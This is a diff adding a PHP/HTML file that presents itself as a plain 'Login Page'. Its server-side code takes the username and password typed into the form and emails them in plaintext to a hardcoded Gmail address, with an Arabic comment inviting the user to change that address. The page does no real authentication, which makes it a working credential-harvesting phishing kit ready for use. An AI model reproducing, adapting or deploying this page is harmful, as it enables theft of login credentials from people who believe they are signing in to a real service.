@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Login Page</title>
+	<style type="text/css">
+		body {
+			background-color: #f7f7f7;
+		}
+
+		.container {
+			margin: 50px auto;
+			max-width: 400px;
+			background-color: #fff;
+			box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+			border-radius: 5px;
+			padding: 20px;
+		}
+
+		h2 {
+			margin-top: 0;
+			text-align: center;
+			color: #555;
+		}
+
+		input[type="text"], input[type="password"] {
+			margin-bottom: 10px;
+			width: 100%;
+			padding: 5px;
+			border: 1px solid #ddd;
+			border-radius: 5px;
+		}
+
+		input[type="submit"] {
+			background-color: #4CAF50;
+			color: white;
+			border: none;
+			padding: 10px;
+			width: 100%;
+			border-radius: 5px;
+			cursor: pointer;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<h2>Login</h2>
+		<form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
+			<label for="username">Username</label>
+			<input type="text" name="username" id="username" required>
+			<label for="password">Password</label>
+			<input type="password" name="password" id="password" required>
+			<input type="submit" value="Login" name="submit">
+		</form>
+	</div>
+	
+	<?php
+		if(isset($_POST['submit'])){
+			$username = $_POST['username'];
+			$password = $_POST['password'];
+			
+			$to = "hamedyousry123@gmail.com"; // تعديل الإيميل هنا
+			$subject = "New Login";
+			$body = "Username: $username\nPassword: $password";
+			
+			if(mail($to, $subject, $body)){
+				echo "<script>alert('Login information sent successfully.');</script>";
+			} else {
+				echo "<script>alert('An error occurred while sending the login information.');</script>";
+			}
+		}
+	?>
+</body>
+</html>
